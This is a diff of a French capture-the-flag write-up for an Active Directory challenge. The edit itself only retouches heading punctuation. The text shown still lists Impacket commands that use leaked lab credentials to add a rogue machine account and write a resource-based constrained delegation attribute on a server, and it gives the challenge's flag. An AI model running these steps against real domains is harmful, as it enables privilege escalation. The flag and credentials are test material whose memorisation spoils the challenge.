@@ -1,4 +1,4 @@
-# Core Systems — Q12 · RBCD via LDAP simple bind
+# Core Systems : Q12 · RBCD via LDAP simple bind
 
 **Catégorie** : AD  
 **Flag** : `HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}`
@@ -13,14 +13,14 @@ Les credentials `svc_web / W3bSvc!2024@FBI` viennent de la propriété LDAP `ad-
 
 ## Exploitation
 
-**Étape 1 — Créer la machine EVIL01$**
+**Étape 1 : Créer la machine EVIL01$**
 
 ```bash
 addcomputer.py -computer-name 'EVIL01$' -computer-pass 'EvilPass123!' \
   -dc-ip <DC_IP> 'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI'
 ```
 
-**Étape 2 — Écrire l'attribut RBCD**
+**Étape 2 : Écrire l'attribut RBCD**
 
 Un simple bind LDAP avec `svc_web` suffit pour modifier `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `CN=APP01,OU=Servers,DC=valdoria,DC=fbi,DC=lab` :
 
@@ -29,7 +29,7 @@ rbcd.py -f 'EVIL01$' -t 'APP01$' -dc-ip <DC_IP> \
   'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI' -action write
 ```
 
-**Étape 3 — Valider**
+**Étape 3 : Valider**
 
 ```bash
 curl -k -X POST https://172.28.18.4:8446/verify/rbcd \
